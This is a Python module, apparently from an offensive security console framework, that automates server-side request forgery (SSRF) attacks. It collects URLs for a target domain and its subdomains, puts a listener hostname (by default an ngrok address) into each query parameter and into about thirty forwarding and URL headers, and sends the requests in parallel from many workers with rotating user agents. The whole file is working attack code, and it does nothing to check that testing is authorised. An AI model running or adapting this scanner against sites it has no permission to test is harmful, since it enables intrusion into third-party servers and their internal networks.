import concurrent.futures
import urllib.parse
import asyncio
import requests
import random
import re

from pathlib import Path

# noinspection PyUnresolvedReferences
from src.provider import *

from src.module.base.BaseModule import BaseModule
from src.core.registry.Registry import ModuleRegistry, OptionRegistry, ProviderRegistry

# from concurrent.futures import ThreadPoolExecutor

from requests.packages.urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter

from prompt_toolkit.shortcuts import PromptSession
from prompt_toolkit.styles import Style


requests.packages.urllib3.disable_warnings()

prompt_style = Style.from_dict({"prompt": "ansired bold"})

user_agents: list = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:53.0) Gecko/20100101 Firefox/53.0",
    "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_1) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.0"
]

injectable_headers: list = [
    "Proxy-Host",
    "Request-Uri",
    "X-Forwarded",
    "X-Forwarded-By",
    "X-Forwarded-For",
    "X-Forwarded-For-Original",
    "X-Forwarded-Host",
    "X-Forwarded-Server",
    "X-Forwarder-For",
    "X-Forward-For",
    "Base-Url",
    "Http-Url",
    "Proxy-Url",
    "Redirect",
    "Real-Ip",
    "Referer",
    "Referer",
    "Referrer",
    "Refferer",
    "Uri",
    "Url",
    "X-Host",
    "X-Http-Destinationurl",
    "X-Http-Host-Override",
    "X-Original-Remote-Addr",
    "X-Original-Url",
    "X-Proxy-Url",
    "X-Rewrite-Url",
    "X-Real-Ip",
    "X-Remote-Addr"
]


class SSRFModule(BaseModule):

    helper: dict = {
        'name': 'ssrf',
        'help': 'This module sets up both header and param SSRF injection attacks',
        'usage': 'use ssrf'
    }

    options: dict = {
        'module': {
            'domain': [
                '',
                'The target domain name to gather URLs for',
                ''
            ],
            'sub-domains': [
                'true',
                'Enable this option to also include sub-domains for target domain',
                'true,false'
            ],
            'listener': [
                '1370c2d89fd2.ngrok.io',
                'The IP or hostname of the listening service used to verify SSRF vulnerabilities',
                ''
            ],
            'workers': [
                '20',
                'The amount of workers to run in parallel',
                ''
            ],
            'custom_urls': [
                'custom_urls.txt',
                'A custom URL(s) file containing URL targets',
                ''
            ]
        }
    }

    def __init__(self, command: str, print_queue: asyncio.Queue, console: object):
        super().__init__()
        self.command: str = command
        self.console: object = console
        self.print_queue: asyncio.Queue = print_queue
        self.module_register: ModuleRegistry = ModuleRegistry()
        self.option_register: OptionRegistry = OptionRegistry()
        self.provider_register: ProviderRegistry = ProviderRegistry()
        self.listening_host: str = ""
        self.max_retries: int = 10

    async def register(self) -> None:
        self.option_register.register_options(options=self.options)

    async def unregister(self) -> None:
        options: dict = self.option_register.dump_register()
        if 'module' in options.keys():
            options.pop('module')
            self.option_register.register_options(options)

    async def main(self) -> None:
        await self.register()
        await self.module_shell()

    async def module_shell(self) -> None:
        session: PromptSession = PromptSession()
        allowed_commands: list = ['set', 'options', 'run', 'back']
        while True:
            try:
                prompt_text: str = self.option_register.get_register('prompt_text')
                sub_prompt: str = f"{prompt_text} [{self.helper['name']}] > "
                data: str = await session.prompt_async(sub_prompt, style=prompt_style)
                if not data or not data.startswith(tuple(allowed_commands)):
                    continue
                if data.startswith(tuple(['back', 'exit'])):
                    raise EOFError
                if data.startswith(tuple(['set', 'options'])):
                    # noinspection PyUnresolvedReferences
                    await self.console.command_interpreter(data)
                if data.startswith(tuple(['run', 'exploit'])):
                    await self.execute()
            except (EOFError, KeyboardInterrupt):
                await self.unregister()
                break

    async def execute(self) -> None:
        domain: str = self.option_register.get_register('domain')
        sub_domains = True if self.option_register.get_register('sub-domains') == 'true' else False
        listener: str = self.option_register.get_register('listener')
        workers: int = int(self.option_register.get_register('workers'))
        custom_urls: str = self.option_register.get_register('custom_urls')
        param_urls: list = []
        urls: list = []

        if not all([domain, sub_domains, listener, workers]):
            await self.print_queue.put(('error', f"Missing SSRF required options.\n"))
            return

        if custom_urls and Path(custom_urls).is_file():
            await self.print_queue.put(('success', f"[+] [{domain}] - Gathering Custom URL data"))
            try:
                with open(custom_urls) as fp:
                    for count, line in enumerate(fp):
                        urls.append(str(line).rstrip('\n'))
                    await self.print_queue.put(
                        ('success', f"[+] [Custom] - {len(urls)} entries added to attack list\n"))
            except OSError:
                await self.print_queue.put(('error', f"[x] Error opening the Custom URL file '{custom_urls}'.\n"))

        urls += await self.gather_urls(domain, sub_domains)
        for p_url in urls:
            output: list = await self.extract_params(p_url)
            if not output:
                continue
            param_urls += output

        await self.print_queue.put((
            'success',
            f"[+] Collection process found {len(urls)} unique URL(s) with {len(param_urls)} individual parameters!.\n"))
        await asyncio.sleep(1)

        if len(urls) == 0:
            await self.print_queue.put(('warning', f"[x] No targets detected for the target domain '{domain}'.\n"))
            return

        confirm: str = input(f"About to run SSRF attacks on {len(param_urls + urls)} URL(s).  Are you sure? [Y/n]: ")
        if confirm.startswith(tuple(['N', 'n'])):
            await self.print_queue.put(('warning', f"[x] User Aborting SSRF attack on the target domain '{domain}'.\n"))
            return

        await self.print_queue.put('')
        await self.print_queue.put(('bold', f"[*] Starting SSRF Header Injection attack on {len(urls)} URLs"))
        await asyncio.sleep(0.25)
        await self.header_injection(urls, listener, workers)
        await self.print_queue.put('')
        await self.print_queue.put(('bold', f"[*] Starting SSRF Parameter Injection attack on {len(param_urls)} URLs"))
        await asyncio.sleep(0.25)
        await self.param_injection(param_urls, listener, workers)

    async def header_injection(self, urls: list, listener: str, workers: int):
        work_queue: asyncio.Queue = asyncio.Queue()
        executor = concurrent.futures.ThreadPoolExecutor()
        for url in urls:
            await work_queue.put(url)
        headers: dict = {'User-Agent': random.choice(user_agents)}
        for header in injectable_headers:
            headers[header] = listener

        loop = asyncio.get_event_loop()
        blocking_io = [loop.run_in_executor(executor, self.fetch_url, work_queue, headers) for _ in range(workers)]
        completed, pending = await asyncio.wait(blocking_io)
        _ = [t.result() for t in completed]

    async def param_injection(self, urls: list, listener: str, workers: int):
        work_queue: asyncio.Queue = asyncio.Queue()
        executor = concurrent.futures.ThreadPoolExecutor()
        for url in urls:
            await work_queue.put(url)
        headers: dict = {'User-Agent': random.choice(user_agents)}

        loop = asyncio.get_event_loop()
        blocking_io = [loop.run_in_executor(
            executor,
            self.fetch_url,
            work_queue,
            headers,
            listener,
            "SSRF_TEST") for _ in range(workers)]
        completed, pending = await asyncio.wait(blocking_io)
        _ = [t.result() for t in completed]

    def fetch_url(self, work_queue: asyncio.Queue, headers, listener=None, placeholder=None):
        while work_queue.empty() is not True:
            url: str = work_queue.get_nowait()
            if placeholder and listener:
                url = url.replace(placeholder, listener)

            self.print_queue.put_nowait(('bold', f"Testing {url}"))
            try:
                with requests.Session() as session:
                    retry = Retry(connect=3, backoff_factor=1, status_forcelist=[429, 504])
                    adapter = HTTPAdapter(max_retries=retry, pool_connections=200, pool_maxsize=200)
                    session.mount('http://', adapter=adapter)
                    session.mount('https://', adapter=adapter)
                    session.get(url, headers=headers, timeout=5)
            except requests.RequestException as e:
                self.print_queue.put_nowait(('error', f"{e.__str__()}\n"))

    async def gather_urls(self, domain: str, sub_domains: bool):
        providers = self.provider_register.dump_register()
        urls_stub: list = []
        for provider in providers:
            if not asyncio.iscoroutinefunction(providers[provider].get_data_set):
                continue
            x: list = await providers[provider](self.print_queue, domain, sub_domains).get_data_set()
            urls_stub = urls_stub + x
        return list(set(urls_stub))

    @staticmethod
    async def extract_params(url: str) -> list:
        placeholder: str = "SSRF_TEST"
        parsed: list = list(re.findall(r'.*?:\/\/.*\?.*\=.+[^$]', url))
        final_urls: list = []

        for p_url in parsed:
            url_parts: list = list(urllib.parse.urlparse(p_url))
            query: dict = dict(urllib.parse.parse_qsl(url_parts[4]))
            for x in query:
                original_value = query[x]
                query[x] = placeholder
                url_parts[4] = urllib.parse.urlencode(query)
                final_urls.append(urllib.parse.urlunparse(url_parts))
                query[x] = original_value

        return list(set(final_urls))
